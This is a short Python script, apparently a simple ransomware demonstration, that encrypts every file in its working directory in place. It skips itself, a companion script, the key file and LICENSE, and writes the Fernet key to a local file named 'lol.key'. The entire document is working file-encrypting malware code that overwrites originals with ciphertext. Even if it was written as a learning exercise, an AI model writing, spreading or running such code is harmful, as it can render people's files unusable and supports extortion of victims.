#C:/Program Files/Python312/python3

import os ## dependency to get access to files
from cryptography.fernet import Fernet ## dependency to encrypt

files = []

## Loops trough the directory and adds all the files that are not current file neither the key into an array
for file in os.listdir():
    if file == "equisde.py" or file == "lol.key" or file == "edsiuqe.py" or file == "LICENSE":
        continue
    if os.path.isfile(file):
        files.append(file)


key = Fernet.generate_key() ## generates key

with open("lol.key", "wb") as dasSchlussel: ## saves the generated key into a file
    dasSchlussel.write(key)

for file in  files: ## reads the contents encrypts them and writes the encrypted contents
    with open(file, "rb") as dieDatei:
        contents =  dieDatei.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as dieDatei:
        dieDatei.write(contents_encrypted)
    print(file + "Has been encrypted")
